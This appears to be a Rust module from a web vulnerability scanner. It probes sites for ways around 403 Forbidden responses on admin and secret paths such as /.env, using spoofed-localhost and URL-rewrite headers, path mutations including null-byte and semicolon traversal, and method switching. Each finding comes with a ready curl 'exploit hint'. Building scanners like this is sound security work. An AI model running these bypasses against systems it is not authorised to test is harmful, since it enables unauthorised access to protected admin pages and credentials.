//! 403 Bypass probe suite.
//!
//! Tests multiple techniques for circumventing HTTP 403 Forbidden responses:
//!
//! - **Path traversal / normalization**: URL encoding, double encoding, path
//!   folding (`/./`, `/../`), backslash substitution, and semicolon insertion.
//! - **HTTP header overrides**: `X-Original-URL`, `X-Rewrite-URL`,
//!   `X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization`, etc.
//! - **Method switching**: trying the same path with GET, POST, HEAD, PUT, PATCH.
//! - **Protocol downgrade**: switching from HTTPS to HTTP.
//!
//! Only runs when the target returns 403 on a common admin/sensitive path.

use gossan_core::Target;
use reqwest::Client;
use scanclient::header_injection::{access_control_bypass_headers, AccessControlBypassHeader};
use secfinding::{Evidence, Finding, Severity};
use std::sync::Arc;

/// Paths commonly blocked by WAFs / auth middleware.
const SENSITIVE_PATHS: &[&str] = &[
    "/admin",
    "/admin/",
    "/api/admin",
    "/api/v1/admin",
    "/dashboard",
    "/console",
    "/manager",
    "/.env",
    "/server-status",
    "/actuator",
    "/actuator/env",
    "/wp-admin",
];

fn header_bypasses(path: &str) -> Vec<AccessControlBypassHeader> {
    access_control_bypass_headers(path)
}

/// URL mutation payloads. Each is a transformation of the original blocked path.
fn path_mutations(path: &str) -> Vec<(String, &'static str)> {
    let trimmed = path.trim_end_matches('/');
    vec![
        (format!("{}%2f", trimmed), "url-encoded trailing slash"),
        (format!("{}/.", trimmed), "path folding /./"),
        (format!("{}..;/", trimmed), "semicolon path traversal"),
        (format!("{}%20/", trimmed), "space-slash suffix"),
        (format!("{}/./", trimmed), "dot-slash normalization"),
        (format!("{};", trimmed), "semicolon suffix (Tomcat)"),
        (format!("{}..%00/", trimmed), "null byte traversal"),
        (format!("{}.json", trimmed), "extension change .json"),
        (format!("{}/~", trimmed), "tilde suffix"),
        (
            format!("/{}", trimmed.to_uppercase().trim_start_matches('/')),
            "case swap",
        ),
    ]
}

/// Probe a web asset for 403 bypass opportunities.
///
/// For each sensitive path that returns 403, tries header-based and
/// URL-mutation-based bypass techniques. Reports when any technique
/// succeeds in getting a non-403 response with content.
pub async fn probe(
    client: &Client,
    target: &Target,
    baseline: Option<&crate::soft404::BaselineFingerprint>,
) -> anyhow::Result<Vec<Finding>> {
    let Target::Web(asset) = target else {
        return Ok(vec![]);
    };
    let base = asset.url.as_str().trim_end_matches('/');
    let mut findings = Vec::new();

    for path in SENSITIVE_PATHS {
        let blocked_url = format!("{}{}", base, path);

        // First, confirm this path actually returns 403.
        let Ok(resp) = client.get(&blocked_url).send().await else {
            tracing::warn!(url = %blocked_url, "403 bypass: confirm request send failed");
            continue;
        };
        if resp.status().as_u16() != 403 {
            continue;
        }

        // ── Header-based bypasses ────────────────────────────────────────
        for bypass in header_bypasses(path) {
            let header = bypass.name;
            let value = bypass.value;
            let label = bypass.label;
            let Ok(resp) = client
                .get(&blocked_url)
                .header(header, value.as_str())
                .send()
                .await
            else {
                tracing::warn!(url = %blocked_url, header = header, "403 bypass: header probe send failed");
                continue;
            };

            let status = resp.status().as_u16();
            if status != 403 && status != 401 && status < 500 {
                let bytes = match crate::soft404::read_limited(resp, crate::MAX_BODY_BYTES).await {
                    Some(b) => b,
                    None => continue,
                };
                let body_len = bytes.len();
                // Only report if there's actually content (not an empty 200).
                if body_len > 0 || status == 302 {
                    if crate::soft404::is_likely_404(status, &bytes, baseline, false) {
                        continue;
                    }
                    gossan_core::try_push_finding(
                        crate::misconfig_finding(
                            target,
                            Severity::High,
                            format!("403 Bypass via {} on {}", label, path),
                            format!(
                                "Path '{}' returned 403, but adding header '{}: {}' \
                                 yielded HTTP {}. The WAF or reverse proxy is using the \
                                 injected header to override the request path or source IP, \
                                 bypassing access controls entirely.",
                                path, header, value, status
                            ),
                        )
                        .tag("403-bypass")
                        .tag("access-control")
                        .tag("web")
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![(
                                Arc::<str>::from(header),
                                Arc::<str>::from(value.as_str()),
                            )],
                            body_excerpt: None,
                        })
                        .exploit_hint(format!("curl -s -H '{header}: {value}' '{blocked_url}'")),
                        &mut findings,
                    );
                    // Don't test more header bypasses for this path (one is enough).
                    break;
                }
            }
        }

        // ── URL mutation bypasses ────────────────────────────────────────
        for (mutated, label) in path_mutations(path) {
            let mutated_url = format!("{}{}", base, mutated);
            let Ok(resp) = client.get(&mutated_url).send().await else {
                tracing::warn!(url = %mutated_url, "403 bypass: mutation probe send failed");
                continue;
            };

            let status = resp.status().as_u16();
            if status != 403 && status != 401 && status != 404 && status < 500 {
                let bytes = match crate::soft404::read_limited(resp, crate::MAX_BODY_BYTES).await {
                    Some(b) => b,
                    None => continue,
                };
                let body_len = bytes.len();
                if body_len > 0 || status == 302 {
                    if crate::soft404::is_likely_404(status, &bytes, baseline, false) {
                        continue;
                    }
                    gossan_core::try_push_finding(
                        crate::misconfig_finding(
                            target,
                            Severity::High,
                            format!("403 Bypass via {} on {}", label, path),
                            format!(
                                "Path '{}' returned 403, but the mutated path '{}' \
                                 returned HTTP {}. The WAF or path normalization logic \
                                 can be circumvented with URL manipulation.",
                                path, mutated, status
                            ),
                        )
                        .tag("403-bypass")
                        .tag("access-control")
                        .tag("web")
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![],
                            body_excerpt: None,
                        })
                        .exploit_hint(format!("curl -s '{mutated_url}'")),
                        &mut findings,
                    );
                    break;
                }
            }
        }

        // ── Method switching ─────────────────────────────────────────────
        for method in &[
            reqwest::Method::POST,
            reqwest::Method::HEAD,
            reqwest::Method::PUT,
        ] {
            let Ok(resp) = client.request(method.clone(), &blocked_url).send().await else {
                tracing::warn!(url = %blocked_url, method = %method, "403 bypass: method probe send failed");
                continue;
            };
            let status = resp.status().as_u16();
            if status != 403 && status != 401 && status != 405 && status < 500 {
                gossan_core::try_push_finding(
                    crate::misconfig_finding(
                        target,
                        Severity::Medium,
                        format!("403 Bypass via {} method on {}", method, path),
                        format!(
                            "Path '{}' returned 403 for GET, but {} returned HTTP {}. \
                             The access control is method-dependent, it only blocks GET \
                             but allows other methods through.",
                            path, method, status
                        ),
                    )
                    .tag("403-bypass")
                    .tag("access-control")
                    .tag("web")
                    .evidence(Evidence::HttpResponse {
                        status,
                        headers: vec![],
                        body_excerpt: None,
                    })
                    .exploit_hint(format!("curl -s -X {} '{}'", method, blocked_url)),
                    &mut findings,
                );
                break;
            }
        }
    }

    Ok(findings)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sensitive_paths_include_admin() {
        assert!(SENSITIVE_PATHS.contains(&"/admin"));
        assert!(SENSITIVE_PATHS.contains(&"/admin/"));
    }

    #[test]
    fn sensitive_paths_include_wp_admin() {
        assert!(SENSITIVE_PATHS.contains(&"/wp-admin"));
    }

    #[test]
    fn header_bypasses_cover_x_original_url() {
        assert!(header_bypasses("/admin")
            .iter()
            .any(|bypass| bypass.name == "X-Original-URL"));
    }

    #[test]
    fn header_bypasses_use_the_blocked_path_for_url_rewrite_headers() {
        let bypasses = header_bypasses("/wp-admin");
        assert!(bypasses
            .iter()
            .any(|bypass| { bypass.name == "X-Original-URL" && bypass.value == "/wp-admin" }));
        assert!(bypasses
            .iter()
            .any(|bypass| { bypass.name == "X-Rewrite-URL" && bypass.value == "/wp-admin" }));
    }

    #[test]
    fn path_mutations_produces_multiple_variants() {
        let mutations = path_mutations("/admin");
        assert!(mutations.len() > 5);
    }

    #[test]
    fn path_mutations_includes_case_swap() {
        let mutations = path_mutations("/admin");
        assert!(mutations.iter().any(|(m, _)| m == "/ADMIN"));
    }

    #[test]
    fn header_bypasses_cover_x_forwarded_for() {
        assert!(header_bypasses("/admin")
            .iter()
            .any(|bypass| bypass.name == "X-Forwarded-For"));
    }

    #[test]
    fn header_bypasses_count_is_reasonable() {
        assert!(header_bypasses("/admin").len() >= 10);
    }

    #[test]
    fn path_mutations_includes_url_encoded_slash() {
        let mutations = path_mutations("/admin");
        assert!(mutations.iter().any(|(m, _)| m.contains("%2f")));
    }

    #[test]
    fn path_mutations_includes_path_folding() {
        let mutations = path_mutations("/admin");
        assert!(mutations.iter().any(|(m, _)| m.contains("/./")));
    }

    #[test]
    fn sensitive_paths_include_env() {
        assert!(SENSITIVE_PATHS.contains(&"/.env"));
    }

    #[test]
    fn path_mutations_empty_path() {
        let mutations = path_mutations("");
        assert!(!mutations.is_empty());
    }

    #[test]
    fn path_mutations_single_char() {
        let mutations = path_mutations("/x");
        assert!(mutations.iter().any(|(m, _)| m == "/X"));
    }

    #[test]
    fn path_mutations_includes_semicolon_traversal() {
        let mutations = path_mutations("/admin");
        assert!(mutations.iter().any(|(m, _)| m.contains("..;/")));
    }

    #[test]
    fn path_mutations_includes_null_byte() {
        let mutations = path_mutations("/admin");
        assert!(mutations.iter().any(|(m, _)| m.contains("%00")));
    }

    #[test]
    fn path_mutations_includes_extension_change() {
        let mutations = path_mutations("/admin");
        assert!(mutations.iter().any(|(m, _)| m.ends_with(".json")));
    }

    #[test]
    fn path_mutations_includes_tilde_suffix() {
        let mutations = path_mutations("/admin");
        assert!(mutations.iter().any(|(m, _)| m.ends_with("~")));
    }

    #[test]
    fn path_mutations_includes_space_suffix() {
        let mutations = path_mutations("/admin");
        assert!(mutations.iter().any(|(m, _)| m.contains("%20")));
    }

    #[test]
    fn path_mutations_includes_semicolon_suffix() {
        let mutations = path_mutations("/admin");
        assert!(mutations.iter().any(|(m, _)| m.ends_with(";")));
    }

    #[test]
    fn path_mutations_preserves_no_trailing_slash() {
        let mutations = path_mutations("/admin/");
        // path_mutations trims trailing slash before mutating
        assert!(mutations.iter().any(|(m, _)| m.contains("/admin")));
    }

    #[test]
    fn header_bypasses_cover_x_rewrite_url() {
        assert!(header_bypasses("/admin")
            .iter()
            .any(|bypass| bypass.name == "X-Rewrite-URL"));
    }

    #[test]
    fn header_bypasses_cover_x_custom_ip() {
        assert!(header_bypasses("/admin")
            .iter()
            .any(|bypass| bypass.name == "X-Custom-IP-Authorization"));
    }

    #[test]
    fn header_bypasses_cover_x_remote_ip() {
        assert!(header_bypasses("/admin")
            .iter()
            .any(|bypass| bypass.name == "X-Remote-IP"));
    }

    #[test]
    fn header_bypasses_cover_x_client_ip() {
        assert!(header_bypasses("/admin")
            .iter()
            .any(|bypass| bypass.name == "X-Client-IP"));
    }

    #[test]
    fn header_bypasses_cover_x_real_ip() {
        assert!(header_bypasses("/admin")
            .iter()
            .any(|bypass| bypass.name == "X-Real-IP"));
    }

    #[test]
    fn header_bypasses_cover_x_originating_ip() {
        assert!(header_bypasses("/admin")
            .iter()
            .any(|bypass| bypass.name == "X-Originating-IP"));
    }

    #[test]
    fn header_bypasses_cover_edge_proxy_headers_from_scanclient() {
        let bypasses = header_bypasses("/admin");
        assert!(bypasses
            .iter()
            .any(|bypass| bypass.name == "True-Client-IP"));
        assert!(bypasses
            .iter()
            .any(|bypass| bypass.name == "CF-Connecting-IP"));
    }

    #[test]
    fn header_bypasses_ip_values_are_localhost() {
        for bypass in header_bypasses("/admin") {
            // URL-rewrite bypasses use /admin; IP bypasses use localhost variants
            assert!(
                bypass.value == "127.0.0.1"
                    || bypass.value == "localhost"
                    || bypass.value == "/admin",
                "unexpected header bypass value: {}",
                bypass.value
            );
        }
    }

    #[tokio::test]
    async fn catch_all_spa_suppresses_false_positive_bypasses() {
        use wiremock::matchers::{method, path, path_regex};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        let shell = "<html><body>SPA shell</body></html>";
        // Exact /admin is blocked for every method.
        Mock::given(path("/admin"))
            .respond_with(ResponseTemplate::new(403))
            .with_priority(2)
            .mount(&server)
            .await;
        // Mutated /admin paths return the same SPA shell, as a catch-all would.
        Mock::given(method("GET"))
            .and(path_regex("/admin/.+"))
            .respond_with(ResponseTemplate::new(200).set_body_string(shell))
            .with_priority(2)
            .mount(&server)
            .await;
        // Baseline probes hit this catch-all.
        Mock::given(method("GET"))
            .respond_with(ResponseTemplate::new(200).set_body_string(shell))
            .mount(&server)
            .await;

        let client = reqwest::Client::new();
        let target = gossan_core::testkit::web_target(&server.uri());
        let baseline = crate::soft404::establish(&client, &server.uri()).await;
        let findings = probe(&client, &target, baseline.as_ref()).await.unwrap();
        assert!(
            findings.is_empty(),
            "expected no 403-bypass findings on a catch-all SPA, got {:?}",
            findings
        );
    }

    #[tokio::test]
    async fn real_bypass_fires_when_body_differs_from_baseline() {
        use wiremock::matchers::{method, path, path_regex};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        let shell = "<html><body>SPA shell</body></html>";
        Mock::given(path("/admin"))
            .respond_with(ResponseTemplate::new(403))
            .with_priority(2)
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path_regex("/admin/.+"))
            .respond_with(
                ResponseTemplate::new(200).set_body_string("admin dashboard ".repeat(100)),
            )
            .with_priority(2)
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .respond_with(ResponseTemplate::new(200).set_body_string(shell))
            .mount(&server)
            .await;

        let client = reqwest::Client::new();
        let target = gossan_core::testkit::web_target(&server.uri());
        let baseline = crate::soft404::establish(&client, &server.uri()).await;
        let findings = probe(&client, &target, baseline.as_ref()).await.unwrap();
        assert!(
            findings.iter().any(|f| f.title().contains("403 Bypass")),
            "expected a 403-bypass finding when mutated body differs from baseline, got {:?}",
            findings
        );
    }
}
